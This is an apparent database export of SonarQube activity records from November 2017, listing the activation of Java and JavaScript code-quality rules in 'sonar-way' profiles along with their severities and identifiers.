287	2017-11-23 16:16:52.205	\N	key=java-sonar-way-86530:squid:S2442;ruleKey=squid:S2442;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXtzJFC7L4qK5dk
288	2017-11-23 16:16:52.208	\N	key=java-sonar-way-86530:squid:S2388;ruleKey=squid:S2388;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXwzJFC7L4qK5dl
289	2017-11-23 16:16:52.211	\N	key=java-sonar-way-86530:squid:S2438;ruleKey=squid:S2438;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXzzJFC7L4qK5dm
290	2017-11-23 16:16:52.214	\N	key=java-sonar-way-86530:squid:S2259;ruleKey=squid:S2259;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquX2zJFC7L4qK5dn
291	2017-11-23 16:16:52.217	\N	key=java-sonar-way-86530:squid:S2583;ruleKey=squid:S2583;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquX5zJFC7L4qK5do
292	2017-11-23 16:16:52.229	\N	key=java-sonar-way-86530:squid:S2095;ruleKey=squid:S2095;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquYFzJFC7L4qK5dp
293	2017-11-23 16:16:52.234	\N	key=java-sonar-way-86530:squid:S2696;ruleKey=squid:S2696;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquYKzJFC7L4qK5dq
294	2017-11-23 16:16:52.238	\N	key=java-sonar-way-86530:squid:S2674;ruleKey=squid:S2674;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquYOzJFC7L4qK5dr
295	2017-11-23 16:16:52.246	\N	key=java-sonar-way-86530:squid:S2718;ruleKey=squid:S2718;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquYWzJFC7L4qK5ds
296	2017-11-23 16:16:52.25	\N	key=java-sonar-way-86530:squid:S2695;ruleKey=squid:S2695;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquYazJFC7L4qK5dt
297	2017-11-23 16:16:52.254	\N	key=java-sonar-way-86530:squid:S2112;ruleKey=squid:S2112;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquYezJFC7L4qK5du
298	2017-11-23 16:16:52.258	\N	key=java-sonar-way-86530:squid:S2387;ruleKey=squid:S2387;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquYizJFC7L4qK5dv
299	2017-11-23 16:16:52.269	\N	key=java-sonar-way-86530:squid:S2786;ruleKey=squid:S2786;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquYtzJFC7L4qK5dw
300	2017-11-23 16:16:52.273	\N	key=java-sonar-way-86530:squid:S2677;ruleKey=squid:S2677;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquYxzJFC7L4qK5dx
301	2017-11-23 16:16:52.277	\N	key=java-sonar-way-86530:squid:S1858;ruleKey=squid:S1858;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquY0zJFC7L4qK5dy
302	2017-11-23 16:16:52.28	\N	key=java-sonar-way-86530:squid:S2864;ruleKey=squid:S2864;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquY4zJFC7L4qK5dz
303	2017-11-23 16:16:52.283	\N	key=java-sonar-way-86530:squid:S2692;ruleKey=squid:S2692;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquY7zJFC7L4qK5d0
304	2017-11-23 16:16:52.286	\N	key=java-sonar-way-86530:squid:S2675;ruleKey=squid:S2675;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquY-zJFC7L4qK5d1
305	2017-11-23 16:16:52.29	\N	key=java-sonar-way-86530:squid:S2676;ruleKey=squid:S2676;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZCzJFC7L4qK5d2
306	2017-11-23 16:16:52.293	\N	key=java-sonar-way-86530:squid:S2885;ruleKey=squid:S2885;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZFzJFC7L4qK5d3
307	2017-11-23 16:16:52.297	\N	key=java-sonar-way-86530:squid:S2222;ruleKey=squid:S2222;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZJzJFC7L4qK5d4
308	2017-11-23 16:16:52.3	\N	key=java-sonar-way-86530:squid:S2097;ruleKey=squid:S2097;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquZMzJFC7L4qK5d5
309	2017-11-23 16:16:52.303	\N	key=java-sonar-way-86530:squid:S2185;ruleKey=squid:S2185;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZPzJFC7L4qK5d6
310	2017-11-23 16:16:52.306	\N	key=java-sonar-way-86530:squid:S2159;ruleKey=squid:S2159;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZSzJFC7L4qK5d7
311	2017-11-23 16:16:52.308	\N	key=java-sonar-way-86530:squid:S2912;ruleKey=squid:S2912;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZUzJFC7L4qK5d8
312	2017-11-23 16:16:52.311	\N	key=java-sonar-way-86530:squid:S2209;ruleKey=squid:S2209;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZXzJFC7L4qK5d9
313	2017-11-23 16:16:52.314	\N	key=java-sonar-way-86530:squid:S1264;ruleKey=squid:S1264;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquZazJFC7L4qK5d-
314	2017-11-23 16:16:52.317	\N	key=java-sonar-way-86530:squid:S2681;ruleKey=squid:S2681;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZdzJFC7L4qK5d_
315	2017-11-23 16:16:52.321	\N	key=java-sonar-way-86530:squid:S1640;ruleKey=squid:S1640;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZhzJFC7L4qK5eA
316	2017-11-23 16:16:52.324	\N	key=java-sonar-way-86530:squid:S2976;ruleKey=squid:S2976;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZkzJFC7L4qK5eB
317	2017-11-23 16:16:52.328	\N	key=java-sonar-way-86530:squid:S1659;ruleKey=squid:S1659;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquZozJFC7L4qK5eC
318	2017-11-23 16:16:52.331	\N	key=java-sonar-way-86530:squid:S1989;ruleKey=squid:S1989;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZrzJFC7L4qK5eD
319	2017-11-23 16:16:52.335	\N	key=java-sonar-way-86530:squid:S1845;ruleKey=squid:S1845;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZuzJFC7L4qK5eE
320	2017-11-23 16:16:52.338	\N	key=java-sonar-way-86530:squid:S2386;ruleKey=squid:S2386;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZyzJFC7L4qK5eF
321	2017-11-23 16:16:52.342	\N	key=java-sonar-way-86530:squid:S2975;ruleKey=squid:S2975;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZ2zJFC7L4qK5eG
322	2017-11-23 16:16:52.345	\N	key=java-sonar-way-86530:squid:S2653;ruleKey=squid:S2653;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquZ5zJFC7L4qK5eH
323	2017-11-23 16:16:52.348	\N	key=java-sonar-way-86530:squid:S1854;ruleKey=squid:S1854;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZ8zJFC7L4qK5eI
324	2017-11-23 16:16:52.351	\N	key=java-sonar-way-86530:squid:S2293;ruleKey=squid:S2293;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquZ_zJFC7L4qK5eJ
325	2017-11-23 16:16:52.354	\N	key=java-sonar-way-86530:squid:S3346;ruleKey=squid:S3346;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquaCzJFC7L4qK5eK
326	2017-11-23 16:16:52.357	\N	key=java-sonar-way-86530:squid:S2147;ruleKey=squid:S2147;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquaFzJFC7L4qK5eL
327	2017-11-23 16:16:52.362	\N	key=java-sonar-way-86530:squid:S2093;ruleKey=squid:S2093;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquaKzJFC7L4qK5eM
328	2017-11-23 16:16:52.366	\N	key=java-sonar-way-86530:squid:S2638;ruleKey=squid:S2638;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquaOzJFC7L4qK5eN
329	2017-11-23 16:16:52.37	\N	key=java-sonar-way-86530:squid:S2737;ruleKey=squid:S2737;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquaSzJFC7L4qK5eO
330	2017-11-23 16:16:52.374	\N	key=java-sonar-way-86530:squid:S2639;ruleKey=squid:S2639;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquaWzJFC7L4qK5eP
331	2017-11-23 16:16:52.378	\N	key=java-sonar-way-86530:squid:S3398;ruleKey=squid:S3398;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquaZzJFC7L4qK5eQ
332	2017-11-23 16:16:52.382	\N	key=java-sonar-way-86530:squid:S2142;ruleKey=squid:S2142;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquaezJFC7L4qK5eR
333	2017-11-23 16:16:52.386	\N	key=java-sonar-way-86530:squid:S3034;ruleKey=squid:S3034;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquaizJFC7L4qK5eS
334	2017-11-23 16:16:52.389	\N	key=java-sonar-way-86530:squid:S3066;ruleKey=squid:S3066;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqualzJFC7L4qK5eT
335	2017-11-23 16:16:52.392	\N	key=java-sonar-way-86530:squid:S3027;ruleKey=squid:S3027;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquaozJFC7L4qK5eU
336	2017-11-23 16:16:52.395	\N	key=java-sonar-way-86530:squid:S2177;ruleKey=squid:S2177;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquarzJFC7L4qK5eV
337	2017-11-23 16:16:52.399	\N	key=java-sonar-way-86530:squid:S3038;ruleKey=squid:S3038;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquavzJFC7L4qK5eW
338	2017-11-23 16:16:52.402	\N	key=java-sonar-way-86530:squid:S2637;ruleKey=squid:S2637;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquayzJFC7L4qK5eX
339	2017-11-23 16:16:52.405	\N	key=java-sonar-way-86530:squid:S3306;ruleKey=squid:S3306;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqua1zJFC7L4qK5eY
340	2017-11-23 16:16:52.409	\N	key=java-sonar-way-86530:squid:S2189;ruleKey=squid:S2189;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqua5zJFC7L4qK5eZ
341	2017-11-23 16:16:52.412	\N	key=java-sonar-way-86530:squid:S2060;ruleKey=squid:S2060;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqua8zJFC7L4qK5ea
342	2017-11-23 16:16:52.415	\N	key=java-sonar-way-86530:squid:S2062;ruleKey=squid:S2062;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqua_zJFC7L4qK5eb
343	2017-11-23 16:16:52.419	\N	key=java-sonar-way-86530:squid:S2140;ruleKey=squid:S2140;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubDzJFC7L4qK5ec
344	2017-11-23 16:16:52.422	\N	key=java-sonar-way-86530:squid:S2188;ruleKey=squid:S2188;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqubGzJFC7L4qK5ed
345	2017-11-23 16:16:52.427	\N	key=java-sonar-way-86530:squid:S2186;ruleKey=squid:S2186;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqubLzJFC7L4qK5ee
346	2017-11-23 16:16:52.43	\N	key=java-sonar-way-86530:squid:S2187;ruleKey=squid:S2187;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubOzJFC7L4qK5ef
347	2017-11-23 16:16:52.434	\N	key=java-sonar-way-86530:squid:S2391;ruleKey=squid:S2391;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqubSzJFC7L4qK5eg
348	2017-11-23 16:16:52.438	\N	key=java-sonar-way-86530:squid:S2970;ruleKey=squid:S2970;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqubWzJFC7L4qK5eh
349	2017-11-23 16:16:52.441	\N	key=java-sonar-way-86530:squid:S2925;ruleKey=squid:S2925;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubZzJFC7L4qK5ei
350	2017-11-23 16:16:52.444	\N	key=java-sonar-way-86530:squid:S2924;ruleKey=squid:S2924;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubczJFC7L4qK5ej
351	2017-11-23 16:16:52.448	\N	key=java-sonar-way-86530:squid:S3422;ruleKey=squid:S3422;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubgzJFC7L4qK5ek
352	2017-11-23 16:16:52.451	\N	key=java-sonar-way-86530:squid:S3421;ruleKey=squid:S3421;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubjzJFC7L4qK5el
353	2017-11-23 16:16:52.455	\N	key=java-sonar-way-86530:squid:S3281;ruleKey=squid:S3281;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqubnzJFC7L4qK5em
354	2017-11-23 16:16:52.46	\N	key=java-sonar-way-86530:squid:S3438;ruleKey=squid:S3438;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqubszJFC7L4qK5en
355	2017-11-23 16:16:52.464	\N	key=java-sonar-way-86530:squid:S3355;ruleKey=squid:S3355;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqubwzJFC7L4qK5eo
356	2017-11-23 16:16:52.489	\N	key=js-sonar-way-48125:javascript:S1442;ruleKey=javascript:S1442;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqucJzJFC7L4qK5ep
357	2017-11-23 16:16:52.515	\N	key=js-sonar-way-48125:javascript:ArrayAndObjectConstructors;ruleKey=javascript:ArrayAndObjectConstructors;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqucjzJFC7L4qK5eq
358	2017-11-23 16:16:52.529	\N	key=js-sonar-way-48125:javascript:BitwiseOperators;ruleKey=javascript:BitwiseOperators;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqucxzJFC7L4qK5er
359	2017-11-23 16:16:52.544	\N	key=js-sonar-way-48125:javascript:S1125;ruleKey=javascript:S1125;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pqudAzJFC7L4qK5es
360	2017-11-23 16:16:52.554	\N	key=js-sonar-way-48125:javascript:BoundOrAssignedEvalOrArguments;ruleKey=javascript:BoundOrAssignedEvalOrArguments;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqudKzJFC7L4qK5et
361	2017-11-23 16:16:52.565	\N	key=js-sonar-way-48125:javascript:CollapsibleIfStatements;ruleKey=javascript:CollapsibleIfStatements;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqudVzJFC7L4qK5eu
362	2017-11-23 16:16:52.577	\N	key=js-sonar-way-48125:javascript:CommentedCode;ruleKey=javascript:CommentedCode;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqudhzJFC7L4qK5ev
363	2017-11-23 16:16:52.589	\N	key=js-sonar-way-48125:javascript:S2688;ruleKey=javascript:S2688;profileKey=js-sonar-way-48125;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqudtzJFC7L4qK5ew
364	2017-11-23 16:16:52.6	\N	key=js-sonar-way-48125:javascript:ConditionalComment;ruleKey=javascript:ConditionalComment;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqud4zJFC7L4qK5ex
365	2017-11-23 16:16:52.611	\N	key=js-sonar-way-48125:javascript:S2228;ruleKey=javascript:S2228;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqueDzJFC7L4qK5ey
442	2017-11-23 16:16:52.932	\N	key=js-sonar-security-way-66631:javascript:S1442;ruleKey=javascript:S1442;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqujEzJFC7L4qK5f_
366	2017-11-23 16:16:52.615	\N	key=js-sonar-way-48125:javascript:ConstructorFunctionsForSideEffects;ruleKey=javascript:ConstructorFunctionsForSideEffects;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqueHzJFC7L4qK5ez
367	2017-11-23 16:16:52.619	\N	key=js-sonar-way-48125:javascript:S2310;ruleKey=javascript:S2310;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqueLzJFC7L4qK5e0
368	2017-11-23 16:16:52.622	\N	key=js-sonar-way-48125:javascript:S1854;ruleKey=javascript:S1854;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqueOzJFC7L4qK5e1
369	2017-11-23 16:16:52.625	\N	key=js-sonar-way-48125:javascript:DebuggerStatement;ruleKey=javascript:DebuggerStatement;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqueRzJFC7L4qK5e2
370	2017-11-23 16:16:52.629	\N	key=js-sonar-way-48125:javascript:S3509;ruleKey=javascript:S3509;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqueVzJFC7L4qK5e3
371	2017-11-23 16:16:52.634	\N	key=js-sonar-way-48125:javascript:S1788;ruleKey=javascript:S1788;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqueazJFC7L4qK5e4
372	2017-11-23 16:16:52.637	\N	key=js-sonar-way-48125:javascript:S2870;ruleKey=javascript:S2870;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquedzJFC7L4qK5e5
373	2017-11-23 16:16:52.641	\N	key=js-sonar-way-48125:javascript:S3001;ruleKey=javascript:S3001;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquehzJFC7L4qK5e6
374	2017-11-23 16:16:52.646	\N	key=js-sonar-way-48125:javascript:S3403;ruleKey=javascript:S3403;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquemzJFC7L4qK5e7
375	2017-11-23 16:16:52.649	\N	key=js-sonar-way-48125:javascript:S1871;ruleKey=javascript:S1871;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquepzJFC7L4qK5e8
376	2017-11-23 16:16:52.659	\N	key=js-sonar-way-48125:javascript:S1862;ruleKey=javascript:S1862;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquezzJFC7L4qK5e9
377	2017-11-23 16:16:52.663	\N	key=js-sonar-way-48125:javascript:DuplicateFunctionArgument;ruleKey=javascript:DuplicateFunctionArgument;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pque3zJFC7L4qK5e-
378	2017-11-23 16:16:52.667	\N	key=js-sonar-way-48125:javascript:DuplicatePropertyName;ruleKey=javascript:DuplicatePropertyName;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pque7zJFC7L4qK5e_
379	2017-11-23 16:16:52.671	\N	key=js-sonar-way-48125:javascript:EmptyBlock;ruleKey=javascript:EmptyBlock;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pque_zJFC7L4qK5fA
380	2017-11-23 16:16:52.674	\N	key=js-sonar-way-48125:javascript:EqEqEq;ruleKey=javascript:EqEqEq;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqufCzJFC7L4qK5fB
381	2017-11-23 16:16:52.678	\N	key=js-sonar-way-48125:javascript:S888;ruleKey=javascript:S888;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqufGzJFC7L4qK5fC
382	2017-11-23 16:16:52.681	\N	key=js-sonar-way-48125:javascript:Eval;ruleKey=javascript:Eval;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqufJzJFC7L4qK5fD
383	2017-11-23 16:16:52.685	\N	key=js-sonar-way-48125:javascript:ExcessiveParameterList;ruleKey=javascript:ExcessiveParameterList;profileKey=js-sonar-way-48125;param_maximumFunctionParameters=7;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqufNzJFC7L4qK5fE
384	2017-11-23 16:16:52.689	\N	key=js-sonar-way-48125:javascript:S1067;ruleKey=javascript:S1067;profileKey=js-sonar-way-48125;param_max=3;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqufRzJFC7L4qK5fF
385	2017-11-23 16:16:52.693	\N	key=js-sonar-way-48125:javascript:S3317;ruleKey=javascript:S3317;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqufVzJFC7L4qK5fG
386	2017-11-23 16:16:52.698	\N	key=js-sonar-way-48125:javascript:S1134;ruleKey=javascript:S1134;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqufazJFC7L4qK5fH
387	2017-11-23 16:16:52.704	\N	key=js-sonar-way-48125:javascript:S1264;ruleKey=javascript:S1264;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pqufgzJFC7L4qK5fI
388	2017-11-23 16:16:52.708	\N	key=js-sonar-way-48125:javascript:ForIn;ruleKey=javascript:ForIn;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqufkzJFC7L4qK5fJ
389	2017-11-23 16:16:52.713	\N	key=js-sonar-way-48125:javascript:S1994;ruleKey=javascript:S1994;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqufpzJFC7L4qK5fK
390	2017-11-23 16:16:52.718	\N	key=js-sonar-way-48125:javascript:S2251;ruleKey=javascript:S2251;profileKey=js-sonar-way-48125;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqufuzJFC7L4qK5fL
391	2017-11-23 16:16:52.722	\N	key=js-sonar-way-48125:javascript:S1472;ruleKey=javascript:S1472;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqufyzJFC7L4qK5fM
392	2017-11-23 16:16:52.727	\N	key=js-sonar-way-48125:javascript:FunctionComplexity;ruleKey=javascript:FunctionComplexity;profileKey=js-sonar-way-48125;param_maximumFunctionComplexityThreshold=10;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquf3zJFC7L4qK5fN
393	2017-11-23 16:16:52.731	\N	key=js-sonar-way-48125:javascript:FunctionDeclarationsWithinBlocks;ruleKey=javascript:FunctionDeclarationsWithinBlocks;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquf7zJFC7L4qK5fO
394	2017-11-23 16:16:52.734	\N	key=js-sonar-way-48125:javascript:FunctionDefinitionInsideLoop;ruleKey=javascript:FunctionDefinitionInsideLoop;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquf-zJFC7L4qK5fP
395	2017-11-23 16:16:52.737	\N	key=js-sonar-way-48125:javascript:FutureReservedWords;ruleKey=javascript:FutureReservedWords;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqugBzJFC7L4qK5fQ
396	2017-11-23 16:16:52.74	\N	key=js-sonar-way-48125:javascript:S3531;ruleKey=javascript:S3531;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugEzJFC7L4qK5fR
397	2017-11-23 16:16:52.744	\N	key=js-sonar-way-48125:javascript:S2990;ruleKey=javascript:S2990;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqugIzJFC7L4qK5fS
398	2017-11-23 16:16:52.747	\N	key=js-sonar-way-48125:javascript:HtmlComments;ruleKey=javascript:HtmlComments;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugLzJFC7L4qK5fT
399	2017-11-23 16:16:52.75	\N	key=js-sonar-way-48125:javascript:S1764;ruleKey=javascript:S1764;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqugOzJFC7L4qK5fU
400	2017-11-23 16:16:52.753	\N	key=js-sonar-way-48125:javascript:S1145;ruleKey=javascript:S1145;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugRzJFC7L4qK5fV
401	2017-11-23 16:16:52.756	\N	key=js-sonar-way-48125:javascript:LabelPlacement;ruleKey=javascript:LabelPlacement;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugUzJFC7L4qK5fW
402	2017-11-23 16:16:52.759	\N	key=js-sonar-way-48125:javascript:S2234;ruleKey=javascript:S2234;profileKey=js-sonar-way-48125;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqugXzJFC7L4qK5fX
403	2017-11-23 16:16:52.764	\N	key=js-sonar-way-48125:javascript:S2681;ruleKey=javascript:S2681;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqugczJFC7L4qK5fY
404	2017-11-23 16:16:52.772	\N	key=js-sonar-way-48125:javascript:MultilineStringLiterals;ruleKey=javascript:MultilineStringLiterals;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugkzJFC7L4qK5fZ
405	2017-11-23 16:16:52.776	\N	key=js-sonar-way-48125:javascript:NamedFunctionExpression;ruleKey=javascript:NamedFunctionExpression;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugozJFC7L4qK5fa
406	2017-11-23 16:16:52.78	\N	key=js-sonar-way-48125:javascript:NestedIfDepth;ruleKey=javascript:NestedIfDepth;profileKey=js-sonar-way-48125;param_maximumNestingLevel=3;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqugszJFC7L4qK5fb
407	2017-11-23 16:16:52.783	\N	key=js-sonar-way-48125:javascript:S2999;ruleKey=javascript:S2999;profileKey=js-sonar-way-48125;param_considerJSDoc=false;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqugvzJFC7L4qK5fc
408	2017-11-23 16:16:52.789	\N	key=js-sonar-way-48125:javascript:S1219;ruleKey=javascript:S1219;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqug1zJFC7L4qK5fd
409	2017-11-23 16:16:52.795	\N	key=js-sonar-way-48125:javascript:NonEmptyCaseWithoutBreak;ruleKey=javascript:NonEmptyCaseWithoutBreak;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqug6zJFC7L4qK5fe
